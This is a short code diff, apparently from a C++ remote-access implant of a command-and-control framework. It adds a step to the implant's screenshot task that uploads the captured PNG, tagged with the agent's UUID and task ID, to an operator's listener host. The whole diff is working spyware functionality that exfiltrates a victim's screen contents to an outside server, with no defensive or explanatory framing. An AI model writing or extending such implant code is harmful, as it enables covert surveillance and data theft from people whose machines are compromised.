@@ -355,6 +355,26 @@ namespace Task
             }
         }
 
+        // Upload the screenshot file.
+        std::wstring wHeaders = L"";
+        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
+        wHeaders += L"X-FILE: screenshot\r\n";
+
+        BOOL bResult = System::Http::UploadFile(
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathUpload,
+            wHeaders.c_str(),
+            wFilenamePng
+        );
+        if (!bResult)
+        {
+            return L"Error: Failed to upload capture image.";
+        }
+
         return wFilenamePng;
     }
 }
